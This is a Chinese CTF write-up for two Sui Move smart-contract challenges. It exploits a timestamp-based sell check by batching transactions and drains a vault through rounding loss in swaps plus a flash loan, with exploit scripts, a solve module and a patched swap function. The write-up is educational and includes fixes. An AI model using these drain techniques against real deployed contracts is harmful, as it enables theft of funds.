        let current_timestamp = clock::timestamp_ms(clock);
        let d100 = current_timestamp % 3;
        let Potato{id, cooked} = potato;
        assert!(cooked, NO_PERMISSION);
        object::delete(id);
        if(d100 == 1){
            let balance = vault::get_balance(vault);
            set_balance(vault, (balance + 5));
            event::emit(Amount{amount: balance + 5});
        }else{
            let id = object::new(ctx);
            object::delete(id);
        }
    }
```

这就是获取balance的方法，购买->处理->卖出，只要卖出成功就可以获得1balance的净收益  
但是有一个问题，在sell\_potato函数中：

```
let d100 = current_timestamp % 3;
if(d100 == 1){
            let balance = vault::get_balance(vault);
            set_balance(vault, (balance + 5));
            event::emit(Amount{amount: balance + 5});
        }else{
            let id = object::new(ctx);
            object::delete(id);
        }

```

也就是说理想状况下每卖出三次才会成功一次，这样是必然亏损的，我们应该使用一个方法来提高我们卖出成功的机率

这里我们可以考虑原子化的思路，把100次购买->处理->卖出 循环一起写进一个函数里面，由于写在一个函数里面，借助原子性可以保证这100次卖出在同一个时间点，因此就会全部成功或者全部失败，如果全部失败的话就直接重启一个环境直到成功，同时也可以把100次购买->处理->卖出 循环和get\_flag一起放进同一个函数里面，由于get\_flag要求200vault，所以如果前面失败的话就会直接abort，只有成功了才能获取到flag，这一整个函数才能成功运行。

### 思路2

```
    public fun init_vault(ctx: &mut TxContext){
        let vault = Vault{
            id: object::new(ctx),
            owner: tx_context::sender(ctx),
            balance: 100,
        };
        transfer::transfer(vault, tx_context::sender(ctx));
    }
```

注意到创建金库函数的可见性为public，即所有人都可以创建，而sell函数中

```
    entry fun sell_potato(clock: &clock::Clock, vault: &mut Vault, potato: Potato, ctx: &mut TxContext){
        assert!(vault::get_owner(vault) == tx_context::sender(ctx), NO_PERMISSION);
        let current_timestamp = clock::timestamp_ms(clock);
        let d100 = current_timestamp % 3;
        let Potato{id, cooked} = potato;
        assert!(cooked, NO_PERMISSION);
        object::delete(id);
        if(d100 == 1){
            let balance = vault::get_balance(vault);
            set_balance(vault, (balance + 5));
            event::emit(Amount{amount: balance + 5});
        }else{
            let id = object::new(ctx);
            object::delete(id);
        }
    }
```

分析得知其校验为assert!(vault::get\_owner(vault) == tx\_context::sender(ctx), NO\_PERMISSION);，只保证了vault的owner正确，同时我们可以创建多个vault，所以我们可以在一个vault里面进行buy和cook操作，然后在一个特定的vault进行sell操作，从而实现特定的vault里拥有足够多的balance，从而实现get\_flag

## exp

### 多个vault合并balance到一个vault里

```
import { TransactionBlock, SuiClient, fromB64 } from "@mysten/sui.js";
import { Ed25519Keypair } from "@mysten/sui.js/keypairs/ed25519";

// ========== 配置 ==========
const RPC_URL = "https://fullnode.testnet.sui.io";
const PRIVATE_KEY_B64 = "<YOUR_PRIVATE_KEY_BASE64>";   
const PACKAGE_ID = "<YOUR_PACKAGE_ID>";           
const VAULT1_ID = "<YOUR_VAULT1_OBJECT_ID>";           // 买 + cook 用
const VAULT2_ID = "<YOUR_VAULT2_OBJECT_ID>";           // 卖出用
const CLOCK_ID = "0x6";                                // Sui 系统 clock 对象 ID
// ==========================

async function main() {
    const client = new SuiClient({ url: RPC_URL });
    const keypair = Ed25519Keypair.fromSecretKey(fromB64(PRIVATE_KEY_B64));
    const sender = keypair.getPublicKey().toSuiAddress();

    const tx = new TransactionBlock();

    const vault1 = tx.object(VAULT1_ID);
    const vault2 = tx.object(VAULT2_ID);
    const clock = tx.object(CLOCK_ID);

    // 1. buy_potato: 注意，这里虽然函数里 transfer 了 Potato，
    //    但是在 PTB 里可以捕获它的返回值（Potato 对象）。
    const [potato] = tx.moveCall({
        target: `${PACKAGE_ID}::potato::buy_potato`,
        arguments: [vault1, tx.object("0x6")], // vault1, ctx
    });

    // 2. cook_potato: 用 vault1 和刚生成的 Potato
    tx.moveCall({
        target: `${PACKAGE_ID}::potato::cook_potato`,
        arguments: [vault1, potato, tx.object("0x6")],
    });

    // 3. sell_potato: 用 vault2 来累计收益
    tx.moveCall({
        target: `${PACKAGE_ID}::potato::sell_potato`,
        arguments: [clock, vault2, potato, tx.object("0x6")],
    });

    tx.setSender(sender);

    const result = await client.signAndExecuteTransactionBlock({
        transactionBlock: tx,
        signer: keypair,
        options: { showEffects: true, showEvents: true },
    });

    console.log("交易结果:", JSON.stringify(result, null, 2));
}

main().catch(err => console.error("执行出错:", err));

```

## 一次性打包100次buy-cook-sell循环

```
import { TransactionBlock, SuiClient, fromB64 } from '@mysten/sui.js';
import { Ed25519Keypair } from '@mysten/sui.js/keypairs/ed25519';

const RPC_URL = "https://fullnode.testnet.sui.io";
const PRIVATE_KEY_B64 = "<YOUR_PRIVATE_KEY_BASE64>";
// 部署的包 ID
const PACKAGE_ID = "<YOUR_PACKAGE_ID>";
// 已经存在的 Vault 对象 ID
const VAULT_ID = "<YOUR_VAULT_ID>";
// 全局时钟对象 ID（Sui 内置 Clock）
const CLOCK_ID = "0x6";

async function main() {
    const client = new SuiClient({ url: RPC_URL });

    const keypair = Ed25519Keypair.fromSecretKey(fromB64(PRIVATE_KEY_B64));
    const address = keypair.getPublicKey().toSuiAddress();

    const tx = new TransactionBlock();

    // 引用 vault 对象
    const vault = tx.object(VAULT_ID);
    const clock = tx.object(CLOCK_ID);

    // 重复 100 次：buy -> cook -> sell
    for (let i = 0; i < 100; i++) {
        // 1. buy_potato 会 transfer 出一个 Potato 对象
        const [potato] = tx.moveCall({
            target: `${PACKAGE_ID}::potato::buy_potato`,
            arguments: [vault, tx.object("0x6")], // vault, TxContext
        });

        // 2. cook_potato (需要 &mut Vault 和 &mut Potato)
        tx.moveCall({
            target: `${PACKAGE_ID}::potato::cook_potato`,
            arguments: [vault, potato, tx.object("0x6")],
        });

        // 3. sell_potato (entry fun, 消耗 potato)
        tx.moveCall({
            target: `${PACKAGE_ID}::potato::sell_potato`,
            arguments: [clock, vault, potato, tx.object("0x6")],
        });
    }

    tx.setSender(address);

    // 签名并发送交易
    const result = await client.signAndExecuteTransactionBlock({
        transactionBlock: tx,
        signer: keypair,
        options: {
            showEffects: true,
            showEvents: true,
        },
    });

    console.log("交易执行结果:", JSON.stringify(result, null, 2));
}

main().catch(err => {
    console.error("执行出错:", err);
});
```

## 注意事项

这里由于buy\_potato函数使用transfer::transfer(potato, tx\_context::sender(ctx));把potato给传递出去了，用以下

```
module solve::potato {
    use sui::tx_context::{Self, TxContext};
    use sui::clock;
    use task7::vault::Vault;
    use task7::potato::{self, Potato};

    public entry fun solve(
        vault1: &mut Vault,
        vault2: &mut Vault,
        clock: &clock::Clock,
        ctx: &mut TxContext
    ) {
        let mut p: Potato = potato::buy_potato(vault1, ctx);

        // 在 vault1 里扣钱烹饪
        potato::cook_potato(vault1, &mut p, ctx);

        // 在 vault2 里卖出（奖励计入 vault2 的余额）
        potato::sell_potato(clock, vault2, p, ctx);
    }
}
```

这个方案并不能成功，因为在这个buy\_potato函数里没有返回potato，无法捕捉到返回值，只能使用ptb的方法

# 共学week4\_extra.

# 分析

```
    public fun get_flag<A,B>(vault: &Vault<A,B>, ctx: &TxContext) {
        assert!(
            balance::value(&vault.coin_a) == 0 && balance::value(&vault.coin_b) == 0, 123
        );
        event::emit(
            Flag {
                win: true,
                sender: tx_context::sender(ctx)
            }
        );
    }
```

分析可知获取flag的方法是vault的coin a和coin b都为0，注意到这里并没有检查是否处于借贷状态，也就是说处于借贷状态也可以get\_flag，只需要在同一次操作里实现借贷,get\_flag,还贷的操作就好了，这也就是说我们只需要把一个coin类型变为0，然后再借出另外一类coin就可以get\_flag了

```
    public entry fun initialize<A,B>(capa: MintA<A>, capb: MintB<B>,ctx: &mut TxContext) {
        let vault = Vault<A, B> {
            id: object::new(ctx),
            coin_a: coin::into_balance(ctfa::mint_for_vault(capa, ctx)),
            coin_b: coin::into_balance(ctfb::mint_for_vault(capb, ctx)),
            flashed: false
        };
        transfer::share_object(vault);
    }

    public(package) fun mint_for_vault<CTFA>(mut mint: MintA<CTFA>, ctx: &mut TxContext): Coin<CTFA> {
        let coinb = coin::mint<CTFA>(&mut mint.cap, 100, ctx);
        coin::mint_and_transfer(&mut mint.cap, 10, tx_context::sender(ctx), ctx);
        let MintA<CTFA> {
            id: ida,
            cap: capa
        } = mint;
        object::delete(ida);
        transfer::public_freeze_object(capa);
        coinb
    }

    public(package) fun mint_for_vault<CTFB>(mut mint: MintB<CTFB>, ctx: &mut TxContext): Coin<CTFB> {
        let coinb = coin::mint<CTFB>(&mut mint.cap, 100, ctx);
        coin::mint_and_transfer(&mut mint.cap, 10, tx_context::sender(ctx), ctx);
        let MintB<CTFB> {
            id: idb,
            cap: capb
        } = mint;
        object::delete(idb);
        transfer::public_freeze_object(capb);
        coinb
    }
```

初始化时产出10A和10B给用户，池子里有100A和100B,我们的任务是让池子里没有coin，这意味着我们不需要保证coin是被我们获取了

```
public fun swap_a_to_b<A,B>(vault: &mut Vault<A,B>, coina:Coin<A>, ctx: &mut TxContext): Coin<B> {
    let amount_out_B = coin::value(&coina) * balance::value(&vault.coin_b) / balance::value(&vault.coin_a);
    coin::put<A>(&mut vault.coin_a, coina);
    coin::take(&mut vault.coin_b, amount_out_B, ctx)
}

public fun swap_b_to_a<A,B>(vault: &mut Vault<A,B>, coinb:Coin<B>, ctx: &mut TxContext): Coin<A> {
        let amount_out_A = coin::value(&coinb) * balance::value(&vault.coin_a) / balance::value(&vault.coin_b);
        coin::put<B>(&mut vault.coin_b, coinb);
        coin::take(&mut vault.coin_a, amount_out_A, ctx)
}
```

众所周知，move语言里不存在浮点数类型，需要小数时需要用除法来实现，而这里使用了除法，可能会出现小数，但是amount\_out\_A和amount\_out\_B却一定是整数，所以在除法之后可能会导致生成小数，然后转存为整数，而小数部分就被约去了，这无疑导致了精度丢失

因此我们得到一个思路：通过不断地swap来实现精度丢失，然后构造一类coin的数值为0，然后用闪电贷借出另一类coin使得两类的数值都为0

## exp

```
module solve_task8::solve {
    use sui::coin::{Coin, join, split};
    use task8::vault::{Vault, flash, repay_flash, swap_a_to_b, swap_b_to_a, get_flag};

    public fun swap_rounds<A,B>(vault: &mut Vault<A,B>, our_10a: Coin<A>, our_10b: Coin<B>, ctx: &mut TxContext) {
        // Use user coin of 10 A and 10 B for initial swapping
        let coin_b = swap_a_to_b(vault, our_10a, ctx); // our_10b=10, coin_b=10, vault:110/90
        let coin_a = swap_b_to_a(vault, our_10b, ctx); // coin_a=12, coin_b=10, vault:98/100
        // keep swapping until A or B balance reaches 0 in vault
        let mut coin_b2 = swap_a_to_b(vault, coin_a, ctx); // coin_b2=12, vault:110/88
        coin_b2.join(coin_b); // coin_b=22, vault:110/88
        let coin_a2 = swap_b_to_a(vault, coin_b2, ctx); // coin_a2=27, vault:83/110
        let coin_b3 = swap_a_to_b(vault, coin_a2, ctx); // coin_b3=35, vault:110/75
        let coin_a3 = swap_b_to_a(vault, coin_b3, ctx); // coin_a3=51, vault:59/110
        let mut coin_b4 = swap_a_to_b(vault, coin_a3, ctx); // coin_b4=95, vault:110/15
        let coin_b40 = coin_b4.split(15, ctx);
        let coin_a4 = swap_b_to_a(vault, coin_b40, ctx); // coin_a4=110, vault:0/30
        let (coin_a5, coin_b5, receipt) = flash(vault, 30, true, ctx); // vault:0/0
        get_flag(vault, ctx);
        repay_flash(vault, coin_a5, coin_b5, receipt);
        transfer::public_transfer(coin_a4, @0x0);
        transfer::public_transfer(coin_b4, @0x0);
    }
}
```

## 修复方案

### swap函数修复

旧版swap函数用旧储备值计算输出且用整型直接乘除（先乘后除）导致“分母很小 => 输出被放大”，攻击者可以循环swap把一侧抽空,所以我们要修改这个算法

这里采用AMM 公式 Δy = Δx \* y / (x + Δx)，可以保证pool里的coin的乘积不会减少，只是类型变化，防止项目方的资产流失

```
public fun swap_a_to_b<A,B>(
    vault: &mut Vault<A,B>,
    coina: Coin<A>,
    ctx: &mut TxContext
): Coin<B> {
    // 读取输入与现有储备
    let in_u64 = coin::value(&coina);
    let reserve_a = balance::value(&vault.coin_a);
    let reserve_b = balance::value(&vault.coin_b);

    // 基本检查
    assert!(in_u64 > 0, 200); // 不允许0量交换
    assert!(reserve_b > 0, 201); // 输出侧必须有余额
    assert!(reserve_a + in_u64 > 0, 202); // 防止除0

    // 先把输入放进池子（更新状态）
    coin::put<A>(&mut vault.coin_a, coina);

    // 使用高位宽整数做中间运算，防止溢出与提高精度
    let in128 = (in_u64 as u128);
    let reserve_b128 = (reserve_b as u128);
    let denom128 = (reserve_a as u128) + in128;

    // 分母包含 in
    let amount_out128 = (in128 * reserve_b128) / denom128;
    let amount_out = amount_out128 as u64;

    // 不能取出超过储备
    assert!(amount_out <= balance::value(&vault.coin_b), 203);

    coin::take(&mut vault.coin_b, amount_out, ctx)
}

public fun swap_b_to_a<A,B>(
    vault: &mut Vault<A,B>,
    coinb: Coin<B>,
    ctx: &mut TxContext
): Coin<A> {
    let in_u64 = coin::value(&coinb);
    let reserve_a = balance::value(&vault.coin_a);
    let reserve_b = balance::value(&vault.coin_b);

    assert!(in_u64 > 0, 210);
    assert!(reserve_a > 0, 211);
    assert!(reserve_b + in_u64 > 0, 212);

    coin::put<B>(&mut vault.coin_b, coinb);

    let in128 = (in_u64 as u128);
    let reserve_a128 = (reserve_a as u128);
    let denom128 = (reserve_b as u128) + in128;

    let amount_out128 = (in128 * reserve_a128) / denom128;
    let amount_out = amount_out128 as u64;

    assert!(amount_out <= balance::value(&vault.coin_a), 213);

    coin::take(&mut vault.coin_a, amount_out, ctx)
}
```
